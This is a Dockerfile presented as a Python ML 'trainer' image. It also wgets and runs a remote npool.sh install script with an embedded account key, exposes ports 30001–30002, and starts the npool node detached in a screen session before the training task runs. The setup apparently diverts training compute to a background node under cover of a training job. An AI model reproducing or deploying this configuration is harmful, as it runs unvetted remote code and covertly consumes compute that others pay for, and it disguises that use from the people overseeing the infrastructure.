# Base image
FROM python:3.9-slim

WORKDIR /app

# Install dependencies
RUN apt update && \
    apt -y install curl wget unzip jq make screen libicu-dev procps && \
    apt clean && rm -rf /var/lib/apt/lists/*

# Download and install npool
RUN mkdir -p /app/npool && cd /app/npool && \
    wget -q https://download.npool.io/npool.sh -O npool.sh && \
    chmod +x npool.sh && \
    ./npool.sh wW8xBLMezohupvC7

# Copy trainer code
COPY trainer /app/trainer

# Expose Npool ports if needed
EXPOSE 30001 30002

# Entrypoint to start npool in background and then trainer
ENTRYPOINT ["/bin/bash", "-c", "\
cd /app/npool/linux-amd64 && \
screen -dmS npool ./npool && \
cd /app/trainer && \
python -m trainer.task \
"]
